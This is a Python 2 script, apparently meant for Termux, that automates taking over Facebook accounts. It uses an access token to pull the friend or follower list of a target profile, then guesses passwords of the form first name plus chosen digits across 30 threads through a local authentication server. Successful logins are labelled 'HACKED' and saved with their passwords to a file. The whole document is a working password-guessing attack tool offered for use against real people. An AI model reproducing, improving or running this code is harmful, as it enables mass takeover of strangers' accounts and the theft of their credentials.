# Coder + Author iZ : RANA MZ
# NAAM TU SUNA HUGA
'''
Note : DONt TRy TO COPy iT BECZ iM THE ONE
'''



import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib, requests, uuid, string
from multiprocessing.pool import ThreadPool
try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass

from requests.exceptions import ConnectionError
bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000.0, 40000.0)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-N950N Build/NMF26X) [FBAN/FB4A;FBAV/251.0.0.31.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/188828013;FBCR/Advance Info Service;FBMF/samsung;FBDV/SM-N950N;FBSV/5.1.1;FBCA/x86;armeabi-v7a;FBDM{density=2.0,width=900,height=1600};FB_FW;FBRV/0;]', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding('utf8')
os.system('termux-setup-storage')
os.system('clear')
logo = '\n\n\x1b[1;92m\n\x1b[1;97m----------------------------------------------\n  Coder + Author iZ   : RANA MZ\n   HAHA   : NAAM TU SUNA HUGA\n   FB + YT  : RANA MZ\n----------------------------------------------\n             \x1b[1;92mNOTE : DONt TRY TO COPY iT BECZ iM THE ONE\n\x1b[1;97m------------------------------------------------\nRANA  MZ [ NAM TU SUNA HUGA ]\n------------------------------------------------ '
CorrectUsername = 'RanaMZ'
loop = 'true'
while loop == 'true':
    print logo
    print '\x1b[1;97m               FIRST STEP LOGIN'
    print '\x1b[1;97m'
    print '\x1b[1;97m '
    username = raw_input('              \x1b[1;94mTOOL USERNAME: ')
    if username == CorrectUsername:
        print '\x1b[1;95m '
        print '         ||\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2 ENJOY FAST CLONING \xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2|| '
        time.sleep(5)
        loop = 'false'
        print '\x1b[1;92m '
        print '               WELCoM GUYS ! '
        time.sleep(10)
        print ' RANA MZ [ NAM TU SUNA HUGA ] !'
        os.system('clear')
    else:
        print ' Rana MZ !'
        os.system('clear')

def reg():
    os.system('clear')
    print logo
    print ''
    print '\t    Generating connection'
    print ''
    print ''
    print '\x1b[1;93m            Connecting...'
    time.sleep(5)
    print ''
    print ''
    print '\x1b[1;92m  [Connected 100%]'
    print ''
    os.system('fuser -k 5000/tcp &')
    os.system('#')
    os.system('cd MZ && npm install')
    os.system('cd MZ && node index.js &')
    os.system('clear')
    time.sleep(5)
    reg2()


def reg2():
    os.system('clear')
    print ''
    print '\x1b[1;97m'
    print ''
    print ''
    print ''
    print '\x1b[1;95m'
    print ' \xe2\x80\xa2 NOTE : USE 4G FAST SPED iNTERNET  \xe2\x80\xa2 '
    time.sleep(2)
    print ''
    print '\x1b[1;96m '
    print ' \xe2\x80\xa2 CODER + AUTHOR iZ RANA MZ  \xe2\x80\xa2 '
    time.sleep(5)
    login()


def login():
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
        menu()
    except (KeyError, IOError):
        print logo
        print ''
        print '\t      [ Login With token ]'
        print ''
        print 'Paste token here '
        token = raw_input(':')
        sav = open('access_token.txt', 'w')
        sav.write(token)
        sav.close()
        menu()


def menu():
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        login()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token, headers=header)
        q = json.loads(r.text)
        name = q['name']
    except KeyError:
        print logo
        print ''
        print '\tLogged in token has expired'
        os.system('rm -rf access_token.txt')
        print ''
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print ''
    print '             LOGIN ID : ' + name
    print ''
    print 47 * '-'
    print ' \x1b[1;91m         RANA MZ'
    print '        { NAAM TU SUNA HUGA }'
    print '\x1b[1;97m'
    print 47 * '-'
    print ''
    print ' [RANA MZ] TYPE RANA MZ THEN STRAT'
    print ' [2] IF YU HAVNT TOKEN TYP 2 THEN ENTER '
    print ' [3] FOR ANY HELP TYP 3 '
    print ''
    menu_option()


def menu_option():
    select = raw_input(' Choose option: ')
    if select == 'RANA MZ':
        crack()
    elif select == '2':
        os.system('xdg-open https://youtu.be/uRQNLV07jR8')
        menu()
    elif select == '3':
        os.system('xdg-open https://www.facebook.com/RanaMZ.zeshi')
        menu()
    else:
        print ''
        print '\tSelect valid option'
        print ''
        menu_option()


def crack():
    global token
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
    except IOError:
        print ''
        print '\tToken not found '
        time.sleep(1)
        login_choice()

    os.system('clear')
    print logo
    print ''
    print ''
    print ''
    print '        [1]  From Public iD'
    print '        [2]  From Followers'
    print '        [0] DAFA KAR'
    print ''
    crack_select()


def crack_select():
    select = raw_input(' Choose option: ')
    id = []
    oks = []
    cps = []
    if select == '1':
        os.system('clear')
        print logo
        print ''
        print ''
        print '\x1b[1;93m \xe2\x8b\x89\xe2\x94\x81\xe2\x94\x81\xe3\x80\x90ENTER YOUR DIGITS\xe3\x80\x91\xe2\x94\x81\xe2\x94\x81\xe2\x8b\x8a'
        print ''
        print '    \x1b[1;94m     \xe2\x97\xa4\xe2\x94\x80\xe3\x80\x90 example : 123 1234 12345 786 \xe3\x80\x91\xe2\x94\x80\xe2\x97\xa5'
        print '\x1b[1;97m'
        print ''
        idt = raw_input(' Input id: ')
        p1 = raw_input(' Name + your digit: ')
        p2 = raw_input(' Name + your digit: ')
        p3 = raw_input(' Name + your digit: ')
        p4 = raw_input(' Name + your digit: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print ''
            print ''
            print ''
            print ' Cloning from : ' + q['name']
        except KeyError:
            print '\tInvalid link OR token'
            print ''
            raw_input(' Press enter to back')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '2':
        os.system('clear')
        print logo
        print logo
        print ''
        print ''
        print '\x1b[1;93m \xe2\x8b\x89\xe2\x94\x81\xe2\x94\x81\xe3\x80\x90ENTER YOUR DIGITS\xe3\x80\x91\xe2\x94\x81\xe2\x94\x81\xe2\x8b\x8a '
        print ''
        print '    \x1b[1;94m     \xe2\x97\xa4\xe2\x94\x80\xe3\x80\x90 example : 123 1234 12345 786 \xe3\x80\x91\xe2\x94\x80\xe2\x97\xa5'
        print '\x1b[1;97m'
        print ''
        idt = raw_input(' Input id: ')
        p1 = raw_input(' Name + your digit: ')
        p2 = raw_input(' Name + your digit: ')
        p3 = raw_input(' Name + your digit: ')
        p4 = raw_input(' Name + your digit: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print ''
            print ''
            print ''
            print ' Cloning from: ' + q['name']
        except KeyError:
            print '\tInvalid id link'
            print ''
            raw_input(' Press enter to back')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999', headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '0':
        menu()
    else:
        print ''
        print '\tSelect valid option'
        print ''
        crack_select()
    print ' Total IDs : ' + str(len(id))
    print ' The Process has started'
    print ''
    print 47 * '-'
    print ''

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            pass1 = name.lower() + p1
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print ' \x1b[1;32m[RANA MZ - HACKED]     \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/mz.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print ' \x1b[1;91m[MZ-CP [ OPEN AFTR 8 DAYS ] ] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('checkpoint.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + p2
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print ' \x1b[1;32m[RANA MZ - HACKED]     \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/mz.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print ' \x1b[1;91m[MZ-CP [ OPEN AFTR 8 DAYS ] ] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('checkpoint.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + p3
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print ' \x1b[1;32m[RANA MZ - HACKED]     \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/mz.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print ' \x1b[1;91m[MZ-CP [ OPEN AFTR 8 DAYS ] ] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        cp = open('checkpoint.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower() + p4
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print ' \x1b[1;32m[RANA MZ - HACKED]     \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/mz.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print ' \x1b[1;91m[MZ-CP [ OPEN AFTR 8 DAYS ] ] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            cp = open('checkpoint.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print ''
    print 47 * '-'
    print ''
    print ' The process has completed'
    print ' Total Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print ''
    print 47 * '-'
    print ''
    raw_input(' Press enter to back')
    crack()


reg()
